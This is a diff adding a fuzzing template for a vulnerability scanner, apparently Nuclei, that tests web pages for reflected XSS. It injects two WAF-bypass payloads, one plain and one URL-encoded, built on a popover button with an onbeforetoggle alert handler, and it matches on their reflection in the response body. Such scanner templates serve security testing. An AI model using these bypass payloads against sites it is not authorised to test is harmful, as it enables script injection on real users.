@@ -1,0 +1,32 @@
+id: universal-xss-bypass-waf
+
+info:
+  name: universal payload for xss bypass waf
+  author: reewardius
+  reference: https://twitter.com/Hashirama_121/status/1690998164944543744/photo/1
+  severity: medium
+  tags: fuzzing-xss,fuzzing-req
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      uniq:
+        - 'xxxx"/><button popovertarget=bugvsme>CLICK HERE</button><xxx onbeforetoggle=alert`` popover id=bugvsme>TEST</xxx>'
+        - 'xxxx"/>%3cbutton%20popovertarget=bugvsme%3eCLICK%20HERE%3c/button%3e%3cxxx%20onbeforetoggle=alert``%20popover%20id=bugvsme%3eTEST%3c/xxx%3e'
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: multiple
+        fuzz:
+          - "{{uniq}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "popover id=bugvsme>TEST</xxx>"
